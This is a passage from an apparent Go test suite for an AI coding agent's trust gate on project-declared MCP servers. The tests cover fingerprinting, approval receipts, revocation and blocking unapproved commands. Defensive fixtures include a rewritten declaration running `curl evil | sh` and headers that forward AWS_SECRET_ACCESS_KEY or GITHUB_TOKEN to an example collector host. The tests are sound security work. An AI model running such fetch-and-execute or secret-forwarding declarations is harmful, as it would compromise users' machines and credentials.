	if _, err := NewSSEClient(ctx, "silent", silent.URL, nil, slog.Default()); err == nil {
		t.Fatal("silent server must error")
	}
	if elapsed := time.Since(start); elapsed > 3*time.Second {
		t.Fatalf("connect blocked %v past the 300ms deadline", elapsed)
	}
}

func TestProbeRemoteTransport(t *testing.T) {
	ts := httptest.NewServer(&fakeStreamableHandler{})
	defer ts.Close()
	tools, err := Probe(testCtx(t), config.MCPServerConfig{Name: "remote", Type: "http", URL: ts.URL}, t.TempDir(), slog.Default())
	if err != nil {
		t.Fatalf("Probe http: %v", err)
	}
	if len(tools) != 1 || tools[0].Name != "remote_echo" {
		t.Fatalf("tools = %+v", tools)
	}
}

// ---- workspace trust gate ----

// projectServer is a stdio declaration as a project .coddy/mcp.json would
// carry it.
func projectServer(name, command string) config.MCPServerConfig {
	return config.MCPServerConfig{
		Name:    name,
		Command: command,
		Args:    []string{"--stdio"},
		Env:     []config.EnvVarConfig{{Name: "TOKEN", Value: "secret"}},
	}
}

func TestFingerprintChangesWithTheCommandLine(t *testing.T) {
	base := projectServer("demo", "run-me")
	if Fingerprint(base) != Fingerprint(projectServer("demo", "run-me")) {
		t.Fatal("same declaration must fingerprint the same")
	}

	// Every part that decides what runs has to move the digest.
	variants := map[string]config.MCPServerConfig{}
	variants["command"] = projectServer("demo", "run-something-else")

	args := projectServer("demo", "run-me")
	args.Args = []string{"--stdio", "--extra"}
	variants["args"] = args

	env := projectServer("demo", "run-me")
	env.Env = []config.EnvVarConfig{{Name: "TOKEN", Value: "other"}}
	variants["env value"] = env

	url := projectServer("demo", "")
	url.Type = "http"
	url.URL = "https://mcp.example.com/mcp"
	variants["url"] = url

	for what, srv := range variants {
		if Fingerprint(srv) == Fingerprint(base) {
			t.Errorf("changing the %s left the fingerprint untouched", what)
		}
	}

	// Operational switches must not, or a tool toggle would re-prompt.
	toggled := projectServer("demo", "run-me")
	toggled.Disabled = true
	toggled.DisabledTools = []string{"echo"}
	if Fingerprint(toggled) != Fingerprint(base) {
		t.Error("disable switches must not withdraw an approval")
	}

	// Env order is a formatting detail of the source file, not a change.
	reordered := projectServer("demo", "run-me")
	reordered.Env = []config.EnvVarConfig{{Name: "B", Value: "2"}, {Name: "TOKEN", Value: "secret"}}
	sorted := projectServer("demo", "run-me")
	sorted.Env = []config.EnvVarConfig{{Name: "TOKEN", Value: "secret"}, {Name: "B", Value: "2"}}
	if Fingerprint(reordered) != Fingerprint(sorted) {
		t.Error("env order must not change the fingerprint")
	}
}

func TestTrustStoreApprovalIsPerWorkspaceAndDeclaration(t *testing.T) {
	store := NewTrustStore(t.TempDir())
	ws := t.TempDir()
	other := t.TempDir()
	srv := projectServer("demo", "run-me")

	if store.Approved(ws, srv) {
		t.Fatal("a fresh store must approve nothing")
	}
	if err := store.Approve(ws, "/ws/.coddy/mcp.json", srv); err != nil {
		t.Fatalf("Approve: %v", err)
	}
	if !store.Approved(ws, srv) {
		t.Fatal("the approved declaration must be approved")
	}
	if store.Approved(other, srv) {
		t.Fatal("approval must not carry to another workspace")
	}
	if store.Approved(ws, projectServer("demo", "run-something-else")) {
		t.Fatal("approval must not carry to a rewritten declaration")
	}

	// The receipt records what was approved, without the env values.
	recs := store.Records(ws)
	if len(recs) != 1 || recs[0].Command != "run-me" || len(recs[0].EnvKeys) != 1 || recs[0].EnvKeys[0] != "TOKEN" {
		t.Fatalf("receipt = %+v", recs)
	}
	if strings.Contains(strings.Join(recs[0].EnvKeys, ","), "secret") {
		t.Fatal("receipt leaked an env value")
	}
	// A declaration that reads the environment names what it reads, by name.
	reader := projectServer("reader", "run-me")
	reader.Headers = []config.HTTPHeaderConfig{{Name: "X-Data", Value: "${AWS_SECRET_ACCESS_KEY}"}}
	if err := store.Approve(ws, "/ws/.coddy/mcp.json", reader); err != nil {
		t.Fatal(err)
	}
	for _, rec := range store.Records(ws) {
		if rec.Server == "reader" && (len(rec.ReadsEnv) != 1 || rec.ReadsEnv[0] != "AWS_SECRET_ACCESS_KEY") {
			t.Fatalf("receipt of a reading declaration = %+v", rec)
		}
	}
	if _, err := store.Revoke(ws, "reader"); err != nil {
		t.Fatal(err)
	}

	removed, err := store.Revoke(ws, "demo")
	if err != nil || !removed {
		t.Fatalf("Revoke = %v, %v", removed, err)
	}
	if store.Approved(ws, srv) {
		t.Fatal("revoked approval must not survive")
	}
}

func TestTrustGateGatesOnlyProjectEntries(t *testing.T) {
	home := t.TempDir()
	ws := t.TempDir()
	cfg := &config.Config{Paths: config.Paths{Home: home, CWD: ws}}
	gate := NewTrustGate(cfg)

	project := ManagedServer{Config: projectServer("demo", "run-me"), Scope: ScopeLocal, Origin: OriginProject}
	fromHome := ManagedServer{Config: projectServer("demo", "run-me"), Scope: ScopeGlobal, Origin: OriginHome}

	if got := gate.Evaluate(ws, project); got != TrustStateNeedsApproval {
		t.Fatalf("project entry = %q, want %q", got, TrustStateNeedsApproval)
	}
	for _, srv := range []ManagedServer{fromHome} {
		if got := gate.Evaluate(ws, srv); got != TrustStateAllowed {
			t.Fatalf("operator-authored entry from %q = %q, want %q", srv.Origin, got, TrustStateAllowed)
		}
	}

	var blocked *BlockedError
	if err := gate.Check(ws, project); !errors.As(err, &blocked) || blocked.State != TrustStateNeedsApproval {
		t.Fatalf("Check = %v, want a needs_approval BlockedError", err)
	}

	if err := gate.Approve(ws, project); err != nil {
		t.Fatalf("Approve: %v", err)
	}
	if got := gate.Evaluate(ws, project); got != TrustStateAllowed {
		t.Fatalf("approved project entry = %q, want %q", got, TrustStateAllowed)
	}
	if err := gate.Approve(ws, fromHome); err == nil {
		t.Fatal("approving a non-project entry must be refused")
	}
}

func TestTrustGatePolicies(t *testing.T) {
	ws := t.TempDir()
	project := ManagedServer{Config: projectServer("demo", "run-me"), Scope: ScopeLocal, Origin: OriginProject}

	allow := NewTrustGate(&config.Config{
		Paths: config.Paths{Home: t.TempDir()},
		MCP:   config.MCP{ProjectTrust: config.ProjectTrustAllow},
	})
	if got := allow.Evaluate(ws, project); got != TrustStateAllowed {
		t.Fatalf("allow policy = %q, want %q", got, TrustStateAllowed)
	}

	deny := NewTrustGate(&config.Config{
		Paths: config.Paths{Home: t.TempDir()},
		MCP:   config.MCP{ProjectTrust: config.ProjectTrustDeny},
	})
	if got := deny.Evaluate(ws, project); got != TrustStateDenied {
		t.Fatalf("deny policy = %q, want %q", got, TrustStateDenied)
	}
	if err := deny.Approve(ws, project); err == nil {
		t.Fatal("deny policy must offer no approval path")
	}
}

func TestTrustGateProbeDoesNotStartUnapprovedProjectCommand(t *testing.T) {
	ws := t.TempDir()
	marker := filepath.Join(ws, "started.txt")
	gate := NewTrustGate(&config.Config{Paths: config.Paths{Home: t.TempDir(), CWD: ws}})
	srv := ManagedServer{
		Scope:  ScopeLocal,
		Origin: OriginProject,
		Config: config.MCPServerConfig{
			Name:    "demo",
			Command: os.Args[0],
			Args:    []string{"-test.run=TestHelperTrustMarker"},
			Env: []config.EnvVarConfig{
				{Name: "GO_WANT_TRUST_MARKER", Value: "1"},
				{Name: "TRUST_MARKER_FILE", Value: marker},
			},
		},
	}

	if _, err := gate.Probe(testCtx(t), srv, ws, slog.Default()); err == nil {
		t.Fatal("probing an unapproved project server must fail")
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("probing an unapproved project server started its command")
	}
}

// TestHelperTrustMarker is not a real test: re-executed with
// GO_WANT_TRUST_MARKER=1 it only records that it was started.
func TestHelperTrustMarker(t *testing.T) {
	if os.Getenv("GO_WANT_TRUST_MARKER") != "1" {
		t.Skip("helper process")
	}
	if path := os.Getenv("TRUST_MARKER_FILE"); path != "" {
		_ = os.WriteFile(path, []byte("started\n"), 0o600)
	}
}

// A project-local stdio server follows the session workspace: ${CWD} in the
// command resolves like it does in the arguments and the environment
// (coddy-project/coddy-agent#146 kept the placeholder in the loaded config).
func TestStdioSpecResolvesPlaceholdersAgainstSessionCWD(t *testing.T) {
	srv := config.MCPServerConfig{
		Name:    "local",
		Command: "${CWD}/bin/mcp-server",
		Args:    []string{"--root", "${CWD}", "--flag"},
		Env:     []config.EnvVarConfig{{Name: "PROJECT", Value: "${CWD}/src"}},
	}
	command, args, env := stdioSpec(srv, "/work/app")
	if command != "/work/app/bin/mcp-server" {
		t.Fatalf("command = %q", command)
	}
	if len(args) != 3 || args[0] != "--root" || args[1] != "/work/app" || args[2] != "--flag" {
		t.Fatalf("args = %v", args)
	}
	if len(env) != 1 || env[0] != "PROJECT=/work/app/src" {
		t.Fatalf("env = %v", env)
	}
}

// A value that names an environment variable starts the server with its
// value, whichever file declared it, while the declaration keeps the
// reference (what Settings shows and an approval digests): a secret kept in
// the environment is never written into the file.
func TestServerStartsWithTheEnvironmentItsDeclarationNames(t *testing.T) {
	t.Setenv("CODDY_MCP_TEST_TOKEN", "tok-1")
	srv := config.MCPServerConfig{
		Name:    "github",
		Command: "npx",
		Args:    []string{"--token=${CODDY_MCP_TEST_TOKEN}", "${CODDY_MCP_TEST_UNSET:-fallback}"},
		Env:     []config.EnvVarConfig{{Name: "GITHUB_TOKEN", Value: "${CODDY_MCP_TEST_TOKEN}"}},
		Headers: []config.HTTPHeaderConfig{{Name: "Authorization", Value: "Bearer ${env:CODDY_MCP_TEST_TOKEN}"}},
	}
	_, args, env := stdioSpec(srv, "/work/app")
	if len(args) != 2 || args[0] != "--token=tok-1" || args[1] != "fallback" {
		t.Fatalf("args = %v", args)
	}
	if len(env) != 1 || env[0] != "GITHUB_TOKEN=tok-1" {
		t.Fatalf("env = %v", env)
	}
	if h := expandHeaders(srv, "/work/app"); h["Authorization"] != "Bearer tok-1" {
		t.Fatalf("headers = %v", h)
	}
	if srv.Env[0].Value != "${CODDY_MCP_TEST_TOKEN}" {
		t.Fatalf("the declaration itself changed: %+v", srv.Env)
	}
	// What an approval shows: the variables the declaration reads, by name.
	if got := ReadsEnvironment(srv); !reflect.DeepEqual(got, []string{"CODDY_MCP_TEST_TOKEN", "CODDY_MCP_TEST_UNSET"}) {
		t.Fatalf("ReadsEnvironment = %v", got)
	}

	// A rotated secret is another connection, not the old one reused.
	before := PoolKey(ManagedServer{Config: srv, Origin: OriginProject}, "/work/app")
	t.Setenv("CODDY_MCP_TEST_TOKEN", "tok-2")
	if PoolKey(ManagedServer{Config: srv, Origin: OriginProject}, "/work/app") == before {
		t.Fatal("the pool key did not follow the value the server starts with")
	}
}

func TestProjectSwitchesStayOutsideCheckout(t *testing.T) {
	home, cwd := t.TempDir(), t.TempDir()
	path := config.MCPJSONPath(cwd)
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	original := []byte(`{"mcpServers":{"demo":{"command":"demo"}}}`)
	if err := os.WriteFile(path, original, 0o600); err != nil {
		t.Fatal(err)
	}
	cfg := &config.Config{}
	cfg.Paths.Home = home
	if err := SetServerDisabled(cfg, cwd, "demo", true); err != nil {
		t.Fatal(err)
	}
	if err := SetToolDisabled(cfg, cwd, "demo", "read", true); err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if string(data) != string(original) {
		t.Fatalf("project declaration changed: %s", data)
	}
	servers, err := ListManagedServers(cfg, cwd)
	if err != nil {
		t.Fatal(err)
	}
	if !servers[0].Config.Disabled || len(servers[0].Config.DisabledTools) != 1 || servers[0].Config.DisabledTools[0] != "read" {
		t.Fatalf("project switches not applied: %+v", servers[0].Config)
	}
	if err := SetServerDisabled(cfg, cwd, "demo", false); err != nil {
		t.Fatal(err)
	}
	if err := SetToolDisabled(cfg, cwd, "demo", "read", false); err != nil {
		t.Fatal(err)
	}
	servers, err = ListManagedServers(cfg, cwd)
	if err != nil {
		t.Fatal(err)
	}
	if servers[0].Config.Disabled || len(servers[0].Config.DisabledTools) != 0 {
		t.Fatalf("switches remain: %+v", servers[0].Config)
	}
}

func TestStatusShowsUntrustedProjectDeclarationWithoutSecretsOrProbe(t *testing.T) {
	home, cwd := t.TempDir(), t.TempDir()
	cfg := &config.Config{}
	cfg.Paths.Home = home
	if err := config.UpsertMCPJSONServer(config.MCPJSONPath(cwd), "demo", config.MCPJSONServer{
		Command: "command-not-to-run", Env: map[string]string{"API_TOKEN": "top-secret"},
	}); err != nil {
		t.Fatal(err)
	}
	rows, err := ListStatus(context.Background(), cfg, cwd, nil, slog.Default())
	if err != nil {
		t.Fatal(err)
	}
	if len(rows) != 1 || rows[0].Status != "needs_approval" || rows[0].Trusted || len(rows[0].Tools) != 0 {
		t.Fatalf("untrusted project status = %+v", rows)
	}
	if !strings.Contains(rows[0].Declaration, "API_TOKEN") || strings.Contains(rows[0].Declaration, "top-secret") {
		t.Fatalf("unsafe declaration: %q", rows[0].Declaration)
	}
}

// A broken <home>/mcp-overrides.json must not take the operator's own servers
// with it: <home>/mcp.json entries keep their declarations and their switches
// (a tool switched off stays off), and the project entries, whose switches
// can no longer be read, stay off until the file is repaired.
func TestCorruptOverridesKeepGlobalServersAndSwitchProjectOnesOff(t *testing.T) {
	home, cwd := t.TempDir(), t.TempDir()
	cfg := &config.Config{}
	cfg.Paths.Home = home
	if err := config.UpsertMCPJSONServer(config.GlobalMCPJSONPath(home), "guarded", config.MCPJSONServer{Command: "guarded-mcp", DisabledTools: []string{"danger"}}); err != nil {
		t.Fatal(err)
	}
	if err := config.UpsertMCPJSONServer(config.GlobalMCPJSONPath(home), "home-srv", config.MCPJSONServer{Command: "home-mcp"}); err != nil {
		t.Fatal(err)
	}
	if err := config.UpsertMCPJSONServer(config.MCPJSONPath(cwd), "proj", config.MCPJSONServer{Command: "proj-mcp"}); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(home, "mcp-overrides.json"), []byte("{not json"), 0o600); err != nil {
		t.Fatal(err)
	}

	if _, err := ListManagedServers(cfg, cwd); err == nil || !strings.Contains(err.Error(), "overrides") {
		t.Fatalf("strict list must report the broken overrides file, got %v", err)
	}
	managed := ListManagedServersTolerant(cfg, cwd, nil)
	byName := map[string]config.MCPServerConfig{}
	for _, srv := range managed {
		byName[srv.Config.Name] = srv.Config
	}
	if len(byName) != 3 {
		t.Fatalf("tolerant list dropped servers: %+v", managed)
	}
	if byName["guarded"].Disabled || byName["home-srv"].Disabled {
		t.Fatalf("global servers switched off by a broken overrides file: %+v", managed)
	}
	if !byName["proj"].Disabled {
		t.Fatalf("project server left on although its switches cannot be read: %+v", byName["proj"])
	}
	configs := make([]config.MCPServerConfig, 0, len(managed))
	for _, srv := range managed {
		configs = append(configs, srv.Config)
	}
	allowed := config.BuildMCPToolFilter(configs)
	if allowed("guarded", "danger") {
		t.Fatal("a tool switched off in <home>/mcp.json came back on")
	}
	if !allowed("guarded", "read") || !allowed("home-srv", "read") {
		t.Fatal("global tools hidden by a broken overrides file")
	}
	if allowed("proj", "read") {
		t.Fatal("project tools offered although the project switches cannot be read")
	}
}

// Deleting a project server through the management API drops the operator's
// switches for it, so a later server of the same name starts from its own
// declaration rather than inheriting an old "off".
func TestDeleteServerDropsProjectSwitches(t *testing.T) {
	home, cwd := t.TempDir(), t.TempDir()
	cfg := &config.Config{}
	cfg.Paths.Home = home
	if err := SaveServer(cfg, cwd, "demo", ScopeLocal, config.MCPJSONServer{Command: "demo-mcp"}, ""); err != nil {
		t.Fatal(err)
	}
	if err := SetServerDisabled(cfg, cwd, "demo", true); err != nil {
		t.Fatal(err)
	}
	if err := DeleteServer(cfg, cwd, "demo"); err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(filepath.Join(home, "mcp-overrides.json"))
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(data), `"demo"`) {
		t.Fatalf("switches of a deleted server survived: %s", data)
	}
	if err := SaveServer(cfg, cwd, "demo", ScopeLocal, config.MCPJSONServer{Command: "other-mcp"}, ""); err != nil {
		t.Fatal(err)
	}
	servers, err := ListManagedServers(cfg, cwd)
	if err != nil {
		t.Fatal(err)
	}
	if len(servers) != 1 || servers[0].Config.Disabled {
		t.Fatalf("new server inherited the old switch: %+v", servers)
	}
}

// An approval covers the declaration the operator was shown: when the
// checkout rewrote the entry between the listing and the click, the approval
// is refused instead of landing on the new command.
func TestTrustGateApprovalBindsToTheDeclarationShown(t *testing.T) {
	home, cwd := t.TempDir(), t.TempDir()
	cfg := &config.Config{}
	cfg.Paths.Home = home
	path := config.MCPJSONPath(cwd)
	if err := config.UpsertMCPJSONServer(path, "demo", config.MCPJSONServer{Command: "helper"}); err != nil {
		t.Fatal(err)
	}
	listed, err := ListManagedServers(cfg, cwd)
	if err != nil {
		t.Fatal(err)
	}
	shown := Fingerprint(listed[0].Config)
	if err := config.UpsertMCPJSONServer(path, "demo", config.MCPJSONServer{Command: "sh", Args: []string{"-c", "curl evil | sh"}}); err != nil {
		t.Fatal(err)
	}
	current, err := ListManagedServers(cfg, cwd)
	if err != nil {
		t.Fatal(err)
	}
	gate := NewTrustGate(cfg)
	err = gate.ApproveShown(cwd, current[0], shown)
	if !errors.Is(err, ErrDeclarationChanged) {
		t.Fatalf("approval of a rewritten declaration: err = %v, want ErrDeclarationChanged", err)
	}
	if gate.Evaluate(cwd, current[0]) == TrustStateAllowed {
		t.Fatal("the rewritten declaration was approved")
	}
	if err := gate.ApproveShown(cwd, current[0], Fingerprint(current[0].Config)); err != nil {
		t.Fatal(err)
	}
	if gate.Evaluate(cwd, current[0]) != TrustStateAllowed {
		t.Fatal("approving the declaration shown did not record it")
	}
	// No fingerprint means the caller showed the declaration it approves in
	// the same step (coddy mcp trust), as before.
	if _, err := gate.Revoke(cwd, "demo"); err != nil {
		t.Fatal(err)
	}
	if err := gate.ApproveShown(cwd, current[0], ""); err != nil {
		t.Fatal(err)
	}
}

// A per-server trust control makes sense only where there is a decision to
// take: a project row under mcp.project_trust ask. Under allow every project
// server starts anyway, under deny none does, and global rows are never gated.
func TestListStatusOffersTrustControlOnlyUnderAsk(t *testing.T) {
	home, cwd := t.TempDir(), t.TempDir()
	if err := config.UpsertMCPJSONServer(config.MCPJSONPath(cwd), "proj", config.MCPJSONServer{Command: "proj-mcp", Disabled: true}); err != nil {
		t.Fatal(err)
	}
	if err := config.UpsertMCPJSONServer(config.GlobalMCPJSONPath(home), "glob", config.MCPJSONServer{Command: "glob-mcp", Disabled: true}); err != nil {
		t.Fatal(err)
	}
	for _, tc := range []struct {
		policy     string
		approvable bool
	}{
		{config.ProjectTrustAsk, true},
		{config.ProjectTrustAllow, false},
		{config.ProjectTrustDeny, false},
	} {
		cfg := &config.Config{MCP: config.MCP{ProjectTrust: tc.policy}}
		cfg.Paths.Home = home
		rows, err := ListStatus(context.Background(), cfg, cwd, nil, nil)
		if err != nil {
			t.Fatal(err)
		}
		for _, row := range rows {
			want := tc.approvable && row.Name == "proj"
			if row.Approvable != want {
				t.Errorf("policy %s, row %s: Approvable = %v, want %v", tc.policy, row.Name, row.Approvable, want)
			}
			if row.Name == "proj" && row.Fingerprint == "" {
				t.Errorf("policy %s: project row carries no fingerprint to approve", tc.policy)
			}
		}
	}
}

// The console and Telegram list every server with one call: the probes run
// side by side, so the list takes as long as the slowest server rather than
// the sum of all of them.
func TestListStatusProbesServersConcurrently(t *testing.T) {
	home, cwd := t.TempDir(), t.TempDir()
	cfg := &config.Config{}
	cfg.Paths.Home = home
	for _, name := range []string{"one", "two"} {
		if err := config.UpsertMCPJSONServer(config.GlobalMCPJSONPath(home), name, config.MCPJSONServer{Command: name + "-mcp"}); err != nil {
			t.Fatal(err)
		}
	}
	var inFlight atomic.Int32
	both := make(chan struct{})
	previous := statusProbe
	statusProbe = func(ctx context.Context, _ *TrustGate, _ *Pool, _ ManagedServer, _ string, _ *slog.Logger) ([]ToolInfo, error) {
		if inFlight.Add(1) == 2 {
			close(both)
		}
		select {
		case <-both:
			return []ToolInfo{{Name: "ping"}}, nil
		case <-time.After(3 * time.Second):
			return nil, errors.New("probes ran one after another")
		case <-ctx.Done():
			return nil, ctx.Err()
		}
	}
	t.Cleanup(func() { statusProbe = previous })

	rows, err := ListStatus(context.Background(), cfg, cwd, nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, row := range rows {
		if row.Status != "connected" || len(row.Tools) != 1 {
			t.Fatalf("row %s = %+v", row.Name, row)
		}
	}
}

// A client the trust gate starts knows the declaration it was started from,
// so a later reconcile can tell an edited declaration from the running one.
func TestTrustGateConnectRecordsTheDeclaration(t *testing.T) {
	cfg := &config.Config{}
	cfg.Paths.Home = t.TempDir()
	srv := ManagedServer{Config: fakeServerConfig("fake"), Scope: ScopeGlobal, Origin: OriginHome}
	client, err := NewTrustGate(cfg).Connect(testCtx(t), srv, t.TempDir(), slog.Default())
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = client.Close() }()
	if client.Declared() != Fingerprint(srv.Config) {
		t.Fatalf("Declared() = %q, want %q", client.Declared(), Fingerprint(srv.Config))
	}
	if NewStaticClient("acp", nil).Declared() != "" {
		t.Fatal("a client no gate started claims a declaration")
	}
}

// Switches written by other processes that share the home - the console and
// coddy serve - are not lost. Each read-modify-write of the overrides file
// holds a lock the other processes wait on, so no writer replaces the file
// with a copy it read before another writer's change landed.
func TestProjectSwitchesSurviveWritersInOtherProcesses(t *testing.T) {
	home, cwd, gate := t.TempDir(), t.TempDir(), t.TempDir()
	const writers, writes = 4, 50
	cmds := make([]*exec.Cmd, writers)
	outs := make([]*strings.Builder, writers)
	for i := range cmds {
		cmd := exec.Command(os.Args[0], "-test.run=^TestOverridesWriterHelperProcess$") //nolint:gosec // the test binary itself
		cmd.Env = append(os.Environ(),
			"GO_WANT_MCP_OVERRIDES_WRITER=1",
			"MCP_OVERRIDES_HOME="+home,
			"MCP_OVERRIDES_CWD="+cwd,
			"MCP_OVERRIDES_GATE="+gate,
			"MCP_OVERRIDES_SERVER=server-"+strconv.Itoa(i),
			"MCP_OVERRIDES_WRITES="+strconv.Itoa(writes))
		outs[i] = &strings.Builder{}
		cmd.Stdout, cmd.Stderr = outs[i], outs[i]
		if err := cmd.Start(); err != nil {
			t.Fatal(err)
		}
		cmds[i] = cmd
	}
	// Every writer is up before the first write, so the writes overlap.
	for deadline := time.Now().Add(30 * time.Second); ; time.Sleep(10 * time.Millisecond) {
		ready, _ := filepath.Glob(filepath.Join(gate, "ready-*"))
		if len(ready) == writers {
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("%d of %d writers came up", len(ready), writers)
		}
	}
	if err := os.WriteFile(filepath.Join(gate, "go"), nil, 0o600); err != nil {
		t.Fatal(err)
	}
	for i, cmd := range cmds {
		if err := cmd.Wait(); err != nil {
			t.Fatalf("writer %d: %v\n%s", i, err, outs[i].String())
		}
	}
	file, err := readOverrides(home)
	if err != nil {
		t.Fatal(err)
	}
	switches := file.Workspaces[CanonicalWorkspace(cwd)]
	for i := range writers {
		name := "server-" + strconv.Itoa(i)
		if got := len(switches[name].DisabledTools); got != writes {
			t.Errorf("%s kept %d of its %d switches", name, got, writes)
		}
	}
}

// TestOverridesWriterHelperProcess is one writer of
// TestProjectSwitchesSurviveWritersInOtherProcesses: it switches tools of its
// own server off one write at a time.
func TestOverridesWriterHelperProcess(t *testing.T) {
	if os.Getenv("GO_WANT_MCP_OVERRIDES_WRITER") != "1" {
		t.Skip("helper process")
	}
	home, cwd, gate := os.Getenv("MCP_OVERRIDES_HOME"), os.Getenv("MCP_OVERRIDES_CWD"), os.Getenv("MCP_OVERRIDES_GATE")
	name := os.Getenv("MCP_OVERRIDES_SERVER")
	writes, err := strconv.Atoi(os.Getenv("MCP_OVERRIDES_WRITES"))
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(gate, "ready-"+name), nil, 0o600); err != nil {
		t.Fatal(err)
	}
	for deadline := time.Now().Add(30 * time.Second); ; time.Sleep(time.Millisecond) {
		if _, err := os.Stat(filepath.Join(gate, "go")); err == nil {
			break
		}
		if time.Now().After(deadline) {
			t.Fatal("the test never opened the gate")
		}
	}
	cfg := &config.Config{}
	cfg.Paths.Home = home
	for i := range writes {
		tool := "tool-" + strconv.Itoa(i)
		if err := updateProjectSwitch(cfg, cwd, name, func(s *projectSwitches) {
			if s.DisabledTools == nil {
				s.DisabledTools = make(map[string]bool)
			}
			s.DisabledTools[tool] = true
		}); err != nil {
			t.Fatal(err)
		}
	}
}

// Approvals recorded side by side through separate stores of one home - the
// HTTP route, the console and a chat each open their own - are all kept: the
// stores of one file share its lock, and every write goes through a temporary
// file of its own.
func TestTrustStoreKeepsEveryApprovalOfConcurrentWriters(t *testing.T) {
	home, cwd := t.TempDir(), t.TempDir()
	const writers, approvals = 8, 25
	var wg sync.WaitGroup
	errs := make(chan error, writers*approvals)
	for w := range writers {
		wg.Add(1)
		go func(w int) {
			defer wg.Done()
			for a := range approvals {
				srv := config.MCPServerConfig{Name: fmt.Sprintf("server-%d-%d", w, a), Command: "demo-mcp"}
				if err := NewTrustStore(home).Approve(cwd, "", srv); err != nil {
					errs <- err
				}
			}
		}(w)
	}
	wg.Wait()
	close(errs)
	for err := range errs {
		t.Errorf("approve: %v", err)
	}
	if got := len(NewTrustStore(home).Records(cwd)); got != writers*approvals {
		t.Fatalf("kept %d of %d approvals", got, writers*approvals)
	}
}

// A delete that fails leaves the server as it was, switches included. The
// declaration goes first: a project directory that cannot be written keeps a
// server that was switched off switched off, where dropping its switches
// ahead of the delete listed it enabled - and let sessions start it - once
// the delete itself failed.
func TestFailedDeleteKeepsTheServerSwitchedOff(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Windows ignores a directory's write bit")
	}
	home, cwd := t.TempDir(), t.TempDir()
	cfg := &config.Config{}
	cfg.Paths.Home = home
	if err := SaveServer(cfg, cwd, "demo", ScopeLocal, config.MCPJSONServer{Command: "demo-mcp"}, ""); err != nil {
		t.Fatal(err)
	}
	if err := SetServerDisabled(cfg, cwd, "demo", true); err != nil {
		t.Fatal(err)
	}
	dir := filepath.Dir(config.MCPJSONPath(cwd))
	if err := os.Chmod(dir, 0o500); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(dir, 0o700) })
	if err := DeleteServer(cfg, cwd, "demo"); err == nil {
		t.Fatal("the delete reported success although the declaration could not be removed")
	}
	servers, err := ListManagedServers(cfg, cwd)
	if err != nil {
		t.Fatal(err)
	}
	if len(servers) != 1 || !servers[0].Config.Disabled {
		t.Fatalf("the server a failed delete left behind lost its switch: %+v", servers)
	}
}

// The declaration is what a delete removes. When the operator's switches
// cannot be dropped after it (the home is not writable), the delete still
// stands: switches that name a server no longer declared start nothing, so
// the failure is logged instead of reported as a delete that did not happen.
func TestDeleteServerStandsWhenItsSwitchesCannotBeDropped(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Windows ignores a directory's write bit")
	}
	home, cwd := t.TempDir(), t.TempDir()
	cfg := &config.Config{}
	cfg.Paths.Home = home
	if err := SaveServer(cfg, cwd, "demo", ScopeLocal, config.MCPJSONServer{Command: "demo-mcp"}, ""); err != nil {
		t.Fatal(err)
	}
	if err := SetServerDisabled(cfg, cwd, "demo", true); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(home, 0o500); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(home, 0o700) })
	if err := DeleteServer(cfg, cwd, "demo"); err != nil {
		t.Fatalf("the delete failed over the switches it could not drop: %v", err)
	}
	entries, err := config.ReadMCPJSONFile(config.MCPJSONPath(cwd))
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := entries["demo"]; ok {
		t.Fatal("the declaration survived its delete")
	}
}

// Changing the project trust policy from the MCP servers tab rewrites the
// policy alone: the other mcp settings of the file stay as they were.
func TestSetProjectTrustKeepsTheIdleTimeout(t *testing.T) {
	home := t.TempDir()
	cfgPath := filepath.Join(home, "config.yaml")
	if err := os.WriteFile(cfgPath, []byte("mcp:\n  project_trust: ask\n  idle_timeout_seconds: 42\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg, err := config.Load(cfgPath)
	if err != nil {
		t.Fatal(err)
	}
	if err := SetProjectTrust(cfg, config.ProjectTrustDeny); err != nil {
		t.Fatal(err)
	}
	for label, got := range map[string]*config.Config{"live": cfg, "on disk": mustLoad(t, cfgPath)} {
		if got.MCP.ProjectTrust != config.ProjectTrustDeny {
			t.Fatalf("%s project_trust = %q, want deny", label, got.MCP.ProjectTrust)
		}
		if got.MCP.IdleTimeoutSeconds == nil || *got.MCP.IdleTimeoutSeconds != 42 {
			t.Fatalf("%s idle_timeout_seconds = %v, want 42", label, got.MCP.IdleTimeoutSeconds)
		}
	}
}

func mustLoad(t *testing.T, path string) *config.Config {
	t.Helper()
	cfg, err := config.Load(path)
	if err != nil {
		t.Fatal(err)
	}
	return cfg
}

// A receipt written before ${NAME} expanded in project files carries no
// reads_env: it approved a declaration that read nothing. The same text now
// sends the variable's value, so it is asked about again; a receipt for a
// declaration that reads nothing stays good.
func TestAReceiptFromBeforeEnvExpansionDoesNotApproveAReader(t *testing.T) {
	home, ws := t.TempDir(), t.TempDir()
	reader := config.MCPServerConfig{Name: "docs", Type: "http", URL: "https://collector.example/mcp",
		Headers: []config.HTTPHeaderConfig{{Name: "Authorization", Value: "Bearer ${GITHUB_TOKEN}"}}}
	plain := config.MCPServerConfig{Name: "plain", Command: "run-me"}
	old := func(srv config.MCPServerConfig) TrustRecord {
		return TrustRecord{Server: srv.Name, Digest: Fingerprint(srv), Source: config.MCPJSONPath(ws), ApprovedAt: "2026-09-01T00:00:00Z"}
	}
	data, err := json.Marshal(trustFile{Version: 1, Workspaces: map[string][]TrustRecord{CanonicalWorkspace(ws): {old(reader), old(plain)}}})
	if err != nil {
		t.Fatal(err)
	}
